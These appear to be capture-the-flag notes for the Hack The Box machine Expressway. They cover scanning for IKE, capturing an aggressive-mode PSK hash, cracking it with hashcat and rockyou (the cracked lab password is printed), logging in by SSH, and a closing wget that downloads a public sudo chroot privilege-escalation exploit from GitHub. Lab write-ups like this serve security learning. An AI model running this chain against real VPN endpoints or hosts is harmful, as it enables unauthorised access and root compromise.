
No ouput from classic nmap scan > scan for udp 
```
ares@legion:~/HackTheBox/Expressway$ nmap -sU -T5 $target    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 11:07 EST
Warning: 10.129.45.91 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.45.91 (10.129.45.91)
Host is up (0.049s latency).
Not shown: 815 open|filtered udp ports (no-response), 184 closed udp ports (port-unreach)
PORT    STATE SERVICE
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 201.58 seconds
```

https://infinitelogins.com/2020/12/08/enumerating-ipsec-ike-isakmp-ports-500-4500-etc/

```
sudo ike-scan $target
```

```
ares@legion:~/HackTheBox/Expressway$ ike-scan --aggressive $target
```
![[Pasted image 20251128182959.png]]

    Encryption: 3DES (weak by modern standards)
    Hash: SHA1 (also considered weak)
    Authentication: PSK (Pre-Shared Key)
    Features: XAUTH and Dead Peer Detection enabled

```
ares@legion:~/HackTheBox/Expressway$ ike-scan -M -A $target  --pskcrack=output.txt 
```
![[Pasted image 20251128183011.png]]

```
ares@legion:~/HackTheBox/Expressway$ hashid output.txt 
--File 'output.txt'--
Analyzing '2411437ce0bc8ca1c3a537b57cd54969529231ad021a17ffd153030439d276231f253532b6a93c6ad04a2719b6525b3541573e9eed9d972d7a91004494f1c977e6b9fffbb1607d8cc9ab4b608881582b6d2ee4e6ddc5551b482bc79c26887f45b8346f893d1cd6bbb9e4448296c72709a3f5fde8ce00f589d1ac551558f1043d:e3698275bccb762be9f2fb146b6655c32b23b7593f6233dfd7def81be80ed36826decbdd0de83382aaa15d68a74bf3242fbcc2b0adc6b9b170d15d78eaa419617c296560f9016a312c8de2f3861a0b7ed37d2ae986a43728d750bcfcf15363ecca18bb8778a4bcc85b3f38c62d47cd07c8d1454f39622252bb22adc6cb82652f:94cb7023ba96fa07:1173e371517444ad:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:b4c6fcc0465986579cfb461bbdd49a85c75a0715:630953f71dd9247f8e730ee102e51e8828ff1ebda4c6bb97ec370444a1c33b35:b99ce926530b8a2dfab060c7b84600eb452726e3'
[+] Unknown hash
--End of file 'output.txt'--                                                                                                                                                          
ares@legion:~/HackTheBox/Expressway$ hashcat --example-hashes | grep IKE 
  Name................: IKE-PSK MD5
  Name................: IKE-PSK SHA1

ares@legion:~/HackTheBox/Expressway$ hashcat --example-hashes | grep IKE -B5 -A5
  Keep.Guessing.......: No
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #5300
  Name................: IKE-PSK MD5
  Category............: Network Protocol
  Slow.Hash...........: No
  Deprecated..........: No
  Deprecated.Notice...: N/A
  Password.Type.......: plain
--
  Keep.Guessing.......: No
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #5400
  Name................: IKE-PSK SHA1
  Category............: Network Protocol
  Slow.Hash...........: No
  Deprecated..........: No
  Deprecated.Notice...: N/A
  Password.Type.......: plain
```

```
hashcat -m 5400 -a 0 output.txt /usr/share/wordlists/rockyou.txt
```
freakingrockstarontheroad

```
ssh ike@expressway.htb
```

/usr/bin/sudo instead of /usr/local/bin/sudo 
![[Pasted image 20251129000448.png]]
![[Pasted image 20251129000611.png]]

Vulnerable to:
https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw

```
wget https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/raw/main/sudo-chwoot.sh
```




